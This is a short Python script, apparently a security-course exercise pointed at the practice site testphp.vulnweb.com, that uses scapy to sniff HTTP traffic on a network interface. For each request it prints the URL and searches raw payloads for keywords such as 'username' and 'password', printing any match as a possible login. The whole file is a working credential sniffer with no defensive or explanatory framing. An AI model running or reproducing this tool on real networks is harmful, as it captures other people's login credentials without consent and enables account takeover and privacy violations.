# testphp.vulnweb.com/login.php
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    return


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            try:
                load = str(packet[scapy.Raw].load)
                keywords = ["username", "uname", "u_name", "user", "login", "password", "pass"]
                for keyword in keywords:
                    if keyword in load:
                        return load
            except UnicodeDecodeError:
                print("\r[-] No printy... can't decode", end="")


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url.decode()}")
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")
    return


sniff("enp0s3")


print("\nGoodbye!")
